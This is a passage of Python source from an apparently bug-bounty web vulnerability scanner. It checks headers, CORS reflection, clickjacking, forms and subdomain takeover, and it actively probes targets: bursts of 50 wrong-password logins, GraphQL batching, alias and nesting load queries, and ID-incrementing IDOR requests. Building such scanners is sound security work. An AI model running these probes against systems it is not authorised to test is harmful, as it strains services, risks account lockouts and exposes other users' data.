        # Phase 3: delegate to HeadersScanner when enabled
        if self._use_new_scanners:
            from scanners import HeadersScanner
            if self._headers_scanner is None:
                self._headers_scanner = HeadersScanner(self.config, self.recon)
                self._headers_scanner.session = self.session
            results = self._headers_scanner.scan()
            for f in results:
                self._add(f)
            return self._get_findings()

        findings: list[dict] = []
        try:
            target = self.config.get("target", "")
            if not target:
                return findings
            if not self._in_scope(target):
                return findings
            resp = safe_get(self.session, target, self.timeout)
            if not resp:
                return findings
            self._scan_missing_headers(findings, target, resp)
            self._scan_disclosure_headers(findings, target, resp)
            self._scan_policy_headers(findings, target, resp)
            self._scan_cookie_headers(findings, target, resp)

            # Also check subdomains discovered during recon
            for sub in (self.recon.get("subdomains", []) or [])[:20]:
                sub_url = f"https://{sub}"
                if not self._in_scope(sub_url):
                    continue
                sub_resp = safe_get(self.session, sub_url, self.timeout)
                if not sub_resp:
                    continue
                self._scan_missing_headers(findings, sub_url, sub_resp)
                self._scan_disclosure_headers(findings, sub_url, sub_resp)
                self._scan_policy_headers(findings, sub_url, sub_resp)
                self._scan_cookie_headers(findings, sub_url, sub_resp)
        except Exception:
            pass
        returned = []
        for f in findings:
            if self._add(f):
                returned.append(f)
        return returned

    def _scan_missing_headers(self, findings: list[dict], target: str, resp) -> None:
        for header, severity in SECURITY_HEADERS.items():
            if header in resp.headers:
                continue
            f = finding(
                vuln_type=f"Missing Security Header: {header}",
                url=target,
                severity=severity,
                details=f"Response is missing the '{header}' header",
                evidence=f"Headers present: {', '.join(list(resp.headers.keys())[:5])}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe missing header: {header}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)

    def _scan_disclosure_headers(self, findings: list[dict], target: str, resp) -> None:
        server = resp.headers.get("Server", "")
        if server and any(c.isdigit() for c in server):
            f = finding(
                vuln_type="Information Disclosure (Server)",
                url=target,
                severity="low",
                details=f"Server header reveals version: {server!r}",
                evidence=f"Server: {server!r}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe server header: {server!r}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        for header, title in (
            ("X-Powered-By", "Information Disclosure (X-Powered-By)"),
            ("X-AspNet-Version", "Information Disclosure (X-AspNet-Version)"),
        ):
            value = resp.headers.get(header, "")
            if value:
                f = finding(
                    vuln_type=title,
                    url=target,
                    severity="low",
                    details=f"{header} reveals tech stack: {value!r}",
                    evidence=f"{header}: {value!r}",
                    request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send GET request to {target}", f"Observe {header} header: {value!r}"],
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f:
                    findings.append(f)

    def _scan_policy_headers(self, findings: list[dict], target: str, resp) -> None:
        csp = resp.headers.get("Content-Security-Policy", "")
        if csp and any(token in csp.lower() for token in ["unsafe-inline", "unsafe-eval", "data:"]):
            f = finding(
                vuln_type="Weak Content Security Policy",
                url=target,
                severity="medium",
                details="CSP contains potentially unsafe directives (unsafe-inline, unsafe-eval, or data:).",
                evidence=f"CSP: {csp[:200]}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", "Observe CSP with unsafe directives"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acc = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        if acao == "*" and acc == "true":
            f = finding(
                vuln_type="Insecure CORS Configuration",
                url=target,
                severity="high",
                details="Access-Control-Allow-Origin is '*' while credentials are allowed.",
                evidence=f"Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acc}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe CORS: {acao} with {acc}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)
        elif acao == "*":
            f = finding(
                vuln_type="Overly Permissive CORS",
                url=target,
                severity="low",
                details="Access-Control-Allow-Origin is set to '*'.",
                evidence=f"Access-Control-Allow-Origin: {acao}",
                request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                response_excerpt=resp.text[:500],
                steps_to_reproduce=[f"Send GET request to {target}", f"Observe CORS: {acao}"],
                verification_stage=VerificationStage.DETECTED.value,
            )
            if f:
                findings.append(f)

        # CORS Origin reflection probe
        try:
            evil_origin = "https://evil-bugbounty-probe.com"
            probe_headers = {"Origin": evil_origin}
            probe_resp = safe_get(self.session, target, self.timeout, headers=probe_headers)
            if probe_resp:
                reflected_acao = probe_resp.headers.get("Access-Control-Allow-Origin", "")
                reflected_acc = probe_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
                if reflected_acao.strip() == evil_origin and reflected_acc == "true":
                    f = finding(
                        vuln_type="CORS Origin Reflection",
                        url=target,
                        severity="critical",
                        details="Access-Control-Allow-Origin reflects Origin header verbatim with credentials allowed — full account access risk",
                        evidence=f"Origin: {evil_origin} -> ACAO: {reflected_acao}, ACC: {reflected_acc}",
                        request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=probe_resp.text[:500],
                        steps_to_reproduce=[f"Send GET request to {target} with Origin: {evil_origin}", "Observe reflected ACAO header"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=[
                            f"Sent request with Origin: {evil_origin}",
                            f"ACAO reflected: {reflected_acao}",
                            "Credentials allowed: true — full CORS trust to arbitrary origin",
                        ],
                    )
                    if f:
                        findings.append(f)
        except Exception:
            pass

    def _scan_cookie_headers(self, findings: list[dict], target: str, resp) -> None:
        cookie_vals = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else [resp.headers.get("Set-Cookie", "")]
        for cookie in cookie_vals:
            if not cookie:
                continue
            missing = []
            if "secure" not in cookie.lower():
                missing.append("Secure")
            if "httponly" not in cookie.lower():
                missing.append("HttpOnly")
            if missing:
                f = finding(
                    vuln_type="Insecure Session Cookie",
                    url=target,
                    severity="medium",
                    details=f"Set-Cookie missing {', '.join(missing)} flags.",
                    evidence=f"Set-Cookie: {cookie[:120]}",
                    request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send GET request to {target}", f"Observe insecure cookie flags: {', '.join(missing)}"],
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f:
                    findings.append(f)

    # ═════════════════════════════════════════════════════════════════════
    # Clickjacking
    # ═════════════════════════════════════════════════════════════════════

    def scan_clickjacking(self) -> list[dict]:
        findings: list[dict] = []
        target = self.config.get("target", "")
        if not target or not self._in_scope(target):
            return findings
        try:
            resp = safe_get(self.session, target, self.timeout, raise_for_status=False)
            if not resp:
                return findings
            x_frame = resp.headers.get("X-Frame-Options", "").lower()
            csp = resp.headers.get("Content-Security-Policy", "").lower()
            allows_frame = not any(directive in csp for directive in CLICKJACKING_SAFE_DIRECTIVES)
            missing_protection = not x_frame and allows_frame
            if missing_protection:
                f = finding(
                    vuln_type="Clickjacking Exposure",
                    url=target,
                    severity="medium",
                    details="The application does not enforce frame protection headers.",
                    evidence=f"X-Frame-Options: {x_frame or 'missing'}, CSP: {csp or 'missing'}",
                    request=_build_curl("GET", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                    response_excerpt=resp.text[:500],
                    steps_to_reproduce=[f"Send GET request to {target}", "Observe missing X-Frame-Options header"],
                    verification_stage=VerificationStage.DETECTED.value,
                )
                if f and self._add(f):
                    findings.append(f)
                log(f"  [CLICKJACKING] {target}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception:
            pass
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # HTTP Methods
    # ═════════════════════════════════════════════════════════════════════

    def scan_http_methods(self, target_urls: list[str] | None = None) -> list[dict]:
        findings: list[dict] = []
        targets = target_urls if target_urls else [self.config.get("target", "")]
        for target in targets:
            if not target or not self._in_scope(target):
                continue
            try:
                resp = self.session.options(target, timeout=self.timeout)
                if not resp:
                    continue
                allow_header = resp.headers.get("Allow", "")
                cors_methods = resp.headers.get("Access-Control-Allow-Methods", "")
                methods = set(self._normalize_list(allow_header) + self._normalize_list(cors_methods))
                dangerous = {"TRACE", "PUT", "DELETE", "PATCH", "PROPFIND"}
                exposed = [m for m in methods if m.upper() in dangerous]
                if exposed:
                    f = finding(
                        vuln_type="Dangerous HTTP Methods Enabled",
                        url=target,
                        severity="medium",
                        details="The server supports non-safe HTTP methods.",
                        evidence=f"Allowed methods: {', '.join(sorted(methods))}",
                        request=_build_curl("OPTIONS", target, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        steps_to_reproduce=[f"Send OPTIONS request to {target}", f"Observe dangerous methods: {', '.join(exposed)}"],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [HTTP METHODS] {target} -> {', '.join(exposed)}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception:
                pass
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Insecure Forms
    # ═════════════════════════════════════════════════════════════════════

    def scan_insecure_forms(self, target_urls: list[str] | None = None) -> list[dict]:
        findings: list[dict] = []
        forms = self.recon.get("forms", [])
        if target_urls is not None:
            origins = {urlparse(u).scheme + "://" + urlparse(u).netloc for u in target_urls}
            forms = [
                f for f in forms
                if any(urlparse(f.get("action", "")).scheme + "://" + urlparse(f.get("action", "")).netloc == o for o in origins)
            ]
        for form in forms:
            try:
                method = form.get("method", "get").lower()
                action = form.get("action", "")
                if not action or method != "post":
                    continue
                parsed = urlparse(action)
                if parsed.scheme == "http":
                    f = finding(
                        vuln_type="Insecure Form Action",
                        url=action,
                        severity="high",
                        details="A POST form submits data over an insecure HTTP connection.",
                        evidence="Form action uses http:// scheme",
                        request=_build_curl("POST", action, {}, data={
                            field.get("name", "field"): field.get("value", "test")
                            for field in form.get("fields", [])[:5]
                        }),
                        response_excerpt="(no request made — vulnerability detected from form structure)",
                        steps_to_reproduce=[
                            f"Navigate to page with form action {action}",
                            "Submit the form over HTTP",
                            "Observe credentials submitted in cleartext",
                        ],
                        verification_stage=VerificationStage.DETECTED.value,
                    )
                    if f and self._add(f):
                        findings.append(f)
                    log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
                    continue
                if any(field.get("type") == "password" for field in form.get("fields", [])):
                    if parsed.netloc and not self._same_origin(action):
                        f = finding(
                            vuln_type="Password Form Cross-Origin Submission",
                            url=action,
                            severity="high",
                            details="A password field submits to a different origin.",
                            evidence=f"Action host: {parsed.netloc}",
                            request=_build_curl("POST", action, {}, data={
                                field.get("name", "field"): field.get("value", "test")
                                for field in form.get("fields", [])[:5]
                            }),
                            response_excerpt="(no request made — vulnerability detected from form structure)",
                            steps_to_reproduce=[
                                f"Navigate to page with form action {action}",
                                "Submit the form to cross-origin endpoint",
                                "Observe credentials submitted cross-origin",
                            ],
                            verification_stage=VerificationStage.DETECTED.value,
                        )
                        if f and self._add(f):
                            findings.append(f)
                        log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Subdomain Takeover
    # ═════════════════════════════════════════════════════════════════════

    def scan_subdomain_takeover(self) -> list[dict]:
        findings: list[dict] = []
        for subdomain in self.recon.get("subdomains", []):
            try:
                for scheme in ("http://", "https://"):
                    target_url = f"{scheme}{subdomain}"
                    if not self._in_scope(target_url):
                        continue
                    resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                    if not resp or not resp.text:
                        continue
                    body = resp.text
                    for signature in TAKEOVER_SIGNATURES:
                        if signature.lower() in body.lower():
                            f = finding(
                                vuln_type="Subdomain Takeover",
                                url=target_url,
                                severity="high",
                                details="A known takeover fingerprint was detected on the subdomain.",
                                evidence=f"Signature: {signature}",
                                request=_build_curl("GET", target_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                                response_excerpt=resp.text[:500],
                                steps_to_reproduce=[f"Send GET request to {target_url}", f"Observe takeover signature: {signature}"],
                                verification_stage=VerificationStage.DETECTED.value,
                            )
                            if f and self._add(f):
                                findings.append(f)
                            log(f"  [TAKEOVER] {target_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            raise StopIteration
            except StopIteration:
                continue
            except Exception:
                continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Rate Limiting
    # ═════════════════════════════════════════════════════════════════════

    def scan_rate_limiting(self, target_urls: list[str] | None = None) -> list[dict]:
        """Test auth-related endpoints for missing or weak rate limiting.

        Builds a candidate list from known auth paths AND forms discovered
        during recon that contain password/secret fields.  Sends 20 rapid
        POST requests with probe credentials, skipping 404/410 endpoints.

        Args:
            target_urls: Optional list of specific URLs. If provided, filters
                        candidates to those matching the given target origin.
        """
        findings: list[dict] = []

        # ── STEP 1: Build candidate list ─────────────────────────────────
        hardcoded_paths = [
            "/login", "/auth/login", "/api/login", "/api/auth/login",
            "/register", "/auth/register", "/api/register",
            "/reset-password", "/auth/reset-password", "/api/reset-password",
            "/forgot-password", "/auth/forgot-password",
            "/api/v1/login", "/api/v1/register",
            "/oauth/token", "/api/token",
        ]

        candidates: list[dict] = []
        seen_urls: set = set()

        def _add_candidate(url: str, sev: str, form_fields: list = None):
            if url in seen_urls:
                return
            seen_urls.add(url)
            candidates.append({"url": url, "severity": sev, "form_fields": form_fields or []})

        base = self.base_url
        if target_urls:
            # Use the first target URL's origin as base
            parsed_target = urlparse(target_urls[0])
            base = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for path in hardcoded_paths:
            full = urljoin(base, path)
            sev = "high" if any(k in path for k in ("login", "auth", "signin", "reset", "password", "token")) else "medium"
            _add_candidate(full, sev)

        forms = self.recon.get("forms", [])
        if target_urls is not None:
            target_origins = {urlparse(u).scheme + "://" + urlparse(u).netloc for u in target_urls}
            forms = [
                f for f in forms
                if any(urlparse(f.get("action", "")).scheme + "://" + urlparse(f.get("action", "")).netloc == o for o in target_origins)
            ]
        for form in forms:
            method = form.get("method", "GET").upper()
            if method != "POST":
                continue
            fields = form.get("fields", [])
            field_names = [f.get("name", "").lower() for f in fields if f.get("name")]
            pw_fields = [n for n in field_names if n in ("password", "passwd", "pass", "secret", "pin", "otp", "code", "token")]
            if not pw_fields:
                continue
            action = form.get("action", "")
            if not action:
                continue
            sev = "high" if pw_fields else "medium"
            _add_candidate(action, sev, fields)

        # ── STEP 2–3: Probe each candidate ──────────────────────────────
        for candidate in candidates:
            test_url = candidate["url"]
            if not self._in_scope(test_url):
                continue
            form_fields = candidate["form_fields"]
            severity = candidate["severity"]

            # Baseline — skip 404/410
            try:
                base_resp = self.session.post(test_url, timeout=self.timeout,
                    data={"baseline": "1"})
                if base_resp.status_code in (404, 410):
                    continue
            except Exception:
                continue

            # Build probe data
            if form_fields:
                probe_data = {}
                for f in form_fields:
                    name = f.get("name", "")
                    ftype = f.get("type", "").lower()
                    if name.lower() in ("password", "passwd", "pass", "secret", "pin", "otp"):
                        probe_data[name] = "Wr0ng_P4ss_probe!"
                    elif name.lower() in ("email", "username", "login"):
                        probe_data[name] = "probe@ratelimit.test"
                    elif name.lower() in ("code", "token"):
                        probe_data[name] = "000000"
                    else:
                        probe_data[name] = f.get("value", "test")
            else:
                probe_data = {
                    "username": "ratelimit_probe_user",
                    "password": "Wr0ng_P4ss_probe!",
                    "email": "probe@ratelimit.test",
                }

            PROBE_COUNT = 50
            results: list[tuple[int, str]] = []
            start = time.time()

            # Use stateless requests.post() per thread, not shared self.session (not thread-safe)
            _probe_cookies = dict(self.session.cookies)
            _probe_headers = dict(self.session.headers)

            def _probe(_idx: int, _url=test_url, _data=probe_data, _timeout=self.timeout,
                       _cookies=_probe_cookies, _headers=_probe_headers) -> tuple[int, str]:
                try:
                    import requests as _requests
                    r = _requests.post(_url, data=_data, timeout=_timeout,
                                       cookies=_cookies, headers=_headers, verify=False)
                    return (r.status_code, r.text[:500])
                except Exception:
                    return (0, "")

            with ThreadPoolExecutor(max_workers=5) as pool:
                for status_code, body_snippet in pool.map(_probe, range(PROBE_COUNT)):
                    results.append((status_code, body_snippet))

            elapsed = time.time() - start
            statuses = [s for s, _ in results]
            bodies = [b for _, b in results]
            unique_statuses = set(statuses)
            has_429 = 429 in unique_statuses
            has_5xx = any(s >= 500 for s in unique_statuses)
            first_body = bodies[0] if bodies else ""
            body_changed = any(b != first_body for b in bodies[1:])

            throttled = has_429 or (body_changed and not has_5xx)
            if not throttled:
                evidence = (
                    f"Sent {PROBE_COUNT} POST requests. Statuses: {sorted(unique_statuses)}. "
                    f"No 429 received. Body changed: {body_changed}. "
                    f"Endpoint: {test_url}"
                )
                f = finding(
                    vuln_type="Missing Rate Limiting",
                    url=test_url,
                    severity=severity,
                    details=f"Endpoint accepted {PROBE_COUNT} POST requests in {elapsed:.1f}s without rate limiting",
                    evidence=evidence,
                    request=_build_curl("POST", test_url, dict(self.session.headers), data=probe_data),
                    response_excerpt=f"Sample response (req 1 of {PROBE_COUNT}): {results[0][1][:300]}" if results else "",
                    verification_stage=VerificationStage.VALIDATED.value,
                    validation_steps=[
                        f"Sent {PROBE_COUNT} burst POST requests to {test_url} (5 workers)",
                        f"Received statuses: {sorted(unique_statuses)}",
                        f"Body changed across requests: {body_changed}",
                        f"No 429 returned — rate limiting absent or ineffective",
                    ],
                )
                if f and self._add(f):
                    findings.append(f)
                    log(f"  [RATE LIMITING] {test_url} — no 429 in {elapsed:.1f}s",
                        Colors.RED, verbose_only=True, verbose=self.verbose)
            elif has_429:
                log(f"  [RATE LIMITING] {test_url} — rate limited (429 present)",
                    Colors.GREEN, verbose_only=True, verbose=self.verbose)
            elif body_changed:
                log(f"  [RATE LIMITING] {test_url} — body changed (throttling suspected)",
                    Colors.YELLOW, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # OpenAPI / Swagger — Endpoint Discovery
    # ═════════════════════════════════════════════════════════════════════

    def scan_openapi(self) -> list[dict]:
        """
        Probe common Swagger/OpenAPI specification paths, parse discovered
        specs, and inject all extracted endpoints back into the URL pool for
        downstream scanners.
        """
        spec_paths = [
            "/swagger.json", "/api/swagger.json",
            "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
            "/openapi.json", "/api/openapi.json",
            "/api-docs", "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
            "/swagger-ui.html", "/swagger-resources",
            "/api/swagger-ui.html", "/api/swagger-resources",
            "/doc", "/api/doc", "/docs", "/api/docs",
            "/spec", "/api/spec",
            "/swagger.yaml", "/api/swagger.yaml",
            "/openapi.yaml", "/api/openapi.yaml",
        ]
        discovered_endpoints: set[str] = set()

        for sp in spec_paths:
            url = self.base_url + sp
            if not self._in_scope(url):
                continue
            try:
                resp = safe_get(self.session, url, self.timeout)
                if not resp:
                    continue
                # Swagger JSON / OpenAPI JSON
                if sp.endswith(".json") or sp.endswith("/api-docs") or "swagger-resources" in sp:
                    try:
                        spec = resp.json()
                        paths = spec.get("paths", {}) or spec.get("apis", {}) or {}
                        if isinstance(paths, dict):
                            for path in paths:
                                full = self.base_url.rstrip("/") + "/" + path.lstrip("/")
                                discovered_endpoints.add(full)
                    except (json.JSONDecodeError, AttributeError):
                        pass
                # Swagger YAML
                elif sp.endswith(".yaml") or sp.endswith(".yml"):
                    try:
                        spec = yaml.safe_load(resp.text)
                        if isinstance(spec, dict):
                            paths = spec.get("paths", {})
                            for path in paths:
                                full = self.base_url.rstrip("/") + "/" + path.lstrip("/")
                                discovered_endpoints.add(full)
                    except yaml.YAMLError:
                        pass
                # HTML pages — look for known paths in page text
                else:
                    found_paths = re.findall(r'"(/?(?:api|v[0-9]+)/[^"]+)"', resp.text)
                    discovered_endpoints.update(
                        self.base_url.rstrip("/") + p if p.startswith("/") else self.base_url.rstrip("/") + "/" + p
                        for p in found_paths
                    )
            except Exception:
                continue

        if discovered_endpoints:
            # Only inject in-scope endpoints
            in_scope = [ep for ep in discovered_endpoints if self._in_scope(ep)]
            self.recon.setdefault("urls", []).extend(in_scope)
            log(f"  [OpenAPI] {len(in_scope)}/{len(discovered_endpoints)} endpoints discovered from spec files", Colors.GREEN)

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # GraphQL
    # ═════════════════════════════════════════════════════════════════════

    def scan_graphql(self) -> list[dict]:
        findings: list[dict] = []
        endpoints = ["/graphql", "/api/graphql", "/nerdgraph/graphql", "/v1/graphql", "/query"]
        introspection_query = {"query": r"{ __schema { types { name } } }"}
        batch_payload = [{"query": "{ __typename }"}] * 50
        headers = {"Content-Type": "application/json"}

        for ep in endpoints:
            url = self.base_url + ep
            if not self._in_scope(url):
                continue

            # ── 1. Introspection ──────────────────────────────────────
            try:
                r = self.session.post(url, json=introspection_query, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and "__schema" in r.text:
                    f = finding(
                        vuln_type="GraphQL Introspection Enabled",
                        url=url,
                        severity="medium",
                        details="Full schema is exposed via introspection.",
                        evidence="__schema",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with introspection query", "Observe __schema in response"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=["GraphQL introspection response received"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 2. Query batching ─────────────────────────────────────
            try:
                r = self.session.post(url, json=batch_payload, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
                    f = finding(
                        vuln_type="GraphQL Query Batching Unrestricted",
                        url=url,
                        severity="medium",
                        details="Server accepts batched GraphQL arrays with no apparent limit. (50 queries in one request)",
                        evidence="__typename",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with batch query", "Observe multiple results"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=["Batch of 50 queries returned 50 responses"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 3. Field suggestion leakage ──────────────────────────
            try:
                r = self.session.post(url, json={"query": "{ "},
                                      headers=headers, timeout=self.timeout)
                if r.status_code == 400 and '"suggestions"' in r.text:
                    f = finding(
                        vuln_type="GraphQL Field Suggestion Leak",
                        url=url,
                        severity="low",
                        details="Error messages contain suggested field names, aiding attacker recon.",
                        evidence="suggestions",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with malformed query", "Observe suggestions in error"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=["Malformed query returned field suggestions"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 4. Alias-based resource exhaustion ───────────────────
            try:
                alias_qs = " ".join(f"a{i}: __typename" for i in range(200))
                r = self.session.post(url, json={"query": "{" + alias_qs + "}"},
                                      headers=headers, timeout=self.timeout)
                if r.status_code == 200:
                    f = finding(
                        vuln_type="GraphQL Alias-Based Query DoS",
                        url=url,
                        severity="low",
                        details="Server accepts 200+ aliases in a single query, allowing resource exhaustion.",
                        evidence="200 aliases accepted",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with 200 aliases", "Observe 200 OK response"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=["200 aliased __typename queries returned 200 results"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 5. Depth limit testing ───────────────────────────────
            try:
                deep_q = "{user{posts{comments{author{posts{comments{author{name}}}}}}}}"
                r = self.session.post(url, json={"query": deep_q},
                                      headers=headers, timeout=self.timeout)
                if r.status_code == 200 and "errors" not in r.text:
                    f = finding(
                        vuln_type="GraphQL Deeply Nested Query Allowed",
                        url=url,
                        severity="low",
                        details="Server allows 7+ levels of nested queries, enabling recursive DoS.",
                        evidence="7+ levels accepted without error",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with deeply nested query", "Observe 200 OK without errors"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=["Deeply nested query returned 200 without errors"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

        return findings

    # ═════════════════════════════════════════════════════════════════════
    # IDOR (legacy, kept for backward compat in scanner.py)
    # ═════════════════════════════════════════════════════════════════════

    def scan_idor(self, target_urls: list[str] | None = None) -> list[dict]:
        findings: list[dict] = []
        id_patterns = [
            (re.compile(r"[?&](account|accountId|account_id|user|userId|user_id|org|orgId|org_id|id|guid|uuid|ref)=([0-9a-f\-]{4,36})", re.IGNORECASE), "param"),
            (re.compile(r"/(accounts|users|orgs|organisations|entities)/([0-9a-f\-]{4,36})", re.IGNORECASE), "path"),
        ]
        candidates = []
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            for pattern, ref_type in id_patterns:
                for m in pattern.finditer(url):
                    candidates.append({"url": url, "param": m.group(1), "value": m.group(2), "type": ref_type})

        seen = set()
        for c in candidates:
            key = (c["param"], c["value"])
            if key in seen:
                continue
            seen.add(key)
            original_val = c["value"]
            original_url = c["url"]
            baseline = safe_get(self.session, original_url, self.timeout, raise_for_status=False)
            if not baseline:
                continue

            if original_val.isdigit():
                for delta in [-1, 1, -100, 100]:
                    test_val = str(int(original_val) + delta)
                    test_url = original_url.replace(original_val, test_val, 1)
                    r = safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    if r and r.status_code == 200 and len(r.text) > 500 and abs(len(r.text) - len(baseline.text)) < 5000 and r.text != baseline.text:
                        f = finding(
                            vuln_type="Potential IDOR",
                            url=test_url,
                            severity="critical",
                            details=f"Parameter '{c['param']}' changed from {original_val} to {test_val} and returned non-identical content.",
                            evidence=r.text[:120],
                            request=_build_curl("GET", test_url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                            response_excerpt=r.text[:500],
                            parameter=c['param'],
                            steps_to_reproduce=[f"Send GET request to {test_url}", "Observe accessible data without authorization"],
                            verification_stage=VerificationStage.DETECTED.value,
                        )
                        if f and self._add(f):
                            findings.append(f)

        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Verify-only mode
    # ═════════════════════════════════════════════════════════════════════

    @staticmethod
    def verify_report(report_path: str, config: dict) -> list[dict]:
        reset_seen_findings()
        import json
        try:
            with open(report_path, "r") as f:
                data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            log(f"[!] Cannot load report: {e}", Colors.RED)
            return []

        old_findings = data.get("findings", [])
        if not old_findings:
            log("[!] No findings to verify", Colors.YELLOW)
            return []

        config["verify_only"] = True
        scanner = VulnScanner(config, data.get("recon_data", {}))
        verified: list[dict] = []
        log(f"[*] Verifying {len(old_findings)} finding(s) …", Colors.CYAN)

        for f in old_findings:
            url = f.get("url", "")
            evidence = f.get("evidence", "")
            if not url:
                continue
            try:
                r = scanner.session.get(url, timeout=scanner.timeout)
                confirmed = evidence in r.text if evidence else r.status_code < 500
                f["confirmed"] = confirmed
                f["last_verified"] = datetime.now(timezone.utc).isoformat()
                verified.append(f)
            except Exception:
                f["confirmed"] = False
                verified.append(f)

        return verified
